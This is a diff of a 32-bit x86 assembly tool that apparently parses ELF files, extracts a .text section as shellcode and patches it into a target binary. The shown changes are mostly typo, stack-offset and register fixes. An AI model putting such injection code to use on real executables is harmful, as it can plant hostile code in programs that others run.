@@ -101,7 +101,7 @@ section .data
 	bad_open_len equ $ - bad_open
 
 	; is an elf file ?
-	bad_elf db "file is not an elf :(", 0x0a, 0x00
+	bad_elf db "file is not an elf !", 0x0a, 0x00
 	bad_elf_len equ $ - bad_elf
 
 	; is stated ?
@@ -335,7 +335,7 @@ finding_shellcode:
 	call find_shell ; returns a pointer to the .text sections, and initializes the shellcode_size variable
 	mov [shellcode], eax
 	test eax, eax	; shell = NULL ?
-	jne ptaching
+	jne patching
 	push ERR_NO_SHELL
 	jmp clean
 
@@ -414,6 +414,10 @@ next4:
 	push dword[shellcode]
 	push dword[shellcode_size]
 	call copy_data
+
+	push shell_copied
+	push shell_copied_len
+	call print
 
 
 	; now all we have to do is :
@@ -580,11 +584,7 @@ copying_loop:
 	jmp copying_loop
 
 copied:
-	push shell_copied
-	push shell_copied_len
-	call print	; "shell copied!"
 	;restoring registers
-	add esp, 8
 	pop edx
 	pop ecx
 	pop edi
@@ -708,11 +708,10 @@ ret_patch:
 find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a pointer to .text section, and stores the shellcode size
 	push ebp
 	mov ebp, esp
-	sub esp, 0xc
-	; some variables here are
-	;[ebp - 4] -> Elf32_Shdr *section = (char *)data + h_ptr -> e_shoff (done)
-	;[ebp - 8] -> Elf32_Shdr *text; uinitialized
-	;[ebp - 0xc] -> (2 bytes value) size_t section_count = h_ptr -> e_shnum (done)
+	sub esp, 0x8
+	; we'll need to declare 2 variables in this routine
+	;[ebp - 4] -> Elf32_Shdr *section = (char *)data + h_ptr -> e_shoff
+	;[ebp - 8] -> (2 bytes value) size_t section_count = h_ptr -> e_shnum
 	;2 bytes for alignements
 
 	;saving registers
@@ -731,7 +730,7 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	;;
 
 
-	;;taking care of the string index table section pointer (@ ebp - 0xc)
+	;;putting a pointer to the string index table offset in memorry in edx so we can use it later
 	mov ax, word[ebx + e_shstrndx]
 	and eax, 0xffff
 	mov ecx, Elf32_Shdr_size
@@ -745,10 +744,10 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	mov edx, eax		; from now on, edx will have the pointer to the string index table, we're gonna
 				; use this later
 
-	;;taking care of section_count (@ ebp - 0xc)
+	;;taking care of section_count (@ ebp - 0x8)
 	mov ax, [ebx + e_shnum]
 	and eax, 0xffff
-	mov [ebp - 0xc], eax
+	mov [ebp - 0x8], eax
 	;
 
 
@@ -773,7 +772,7 @@ parsing_loop:
 	;;
 
 	inc ecx
-	cmp cx, word[ebp - 0xc] ; e_shnum
+	cmp cx, word[ebp - 0x8] ; e_shnum
 	jne parsing_loop
 
 no_text_section:
@@ -782,7 +781,7 @@ no_text_section:
 	push no_text
 	push no_text_len
 	call print
-	add esp, 0x18
+	add esp, 0x14
 	jmp ret_text_section
 
 
@@ -798,7 +797,7 @@ found_text_section:;
 	mov ecx, [ecx + sh_size]
 	mov [ebx], ecx
 	;
-	add esp, 0x10
+	add esp, 0xc
 
 ret_text_section:
 	;restoring registers
@@ -812,7 +811,7 @@ ret_text_section:
 
 
 
-unmap:; void unmap(void *data, size_size) ; not used yet, TODO : use this function and close the files at the end of _start
+unmap:; void unmap(void *data, size_size)
 	push ebp
 	mov ebp, esp
 	;saving registers ; might not be necessary
@@ -856,7 +855,7 @@ close: ; void close(int fd);
 
 
 
-get_file_size:	; void get_file_size(int fd);
+get_file_size:	; size_t get_file_size(int fd);
 	push ebp
 	mov ebp, esp
 	sub esp, stat_size
@@ -924,20 +923,21 @@ strlen:; size_t strlen(char *buf);
 	mov ebp, esp
 	;saving registers
 	push ebx
+	push ecx
 	;
-	mov eax, -1
+	mov ecx, -1
 	mov ebx, [ebp + 0x8]
 loop:
-	inc eax
-	cmp byte[ebx + eax], 0
+	inc ecx
+	cmp byte[ebx + ecx], 0
 	jne loop
+	mov eax, ecx
 	;restoring registers
+	pop ecx
 	pop ebx
 	;
-	mov esp, ebp
 	pop ebp
 	ret
-
 
 
 is_target_elf: 	; int is_target_elf(void *data)
@@ -970,9 +970,6 @@ good_elf_ptr:
 	jmp ret_arch
 
 is_32_bit:
-	;push good_32_bit_elf
-	;push good_32_bit_elf_len
-	call print ; file is a 32 bit elf
 	xor eax, eax
 
 ret_arch:
@@ -1033,3 +1030,4 @@ exit:	;void exit(int return_stat)
 	pop ebx
 	inc eax
 	int 0x80
+
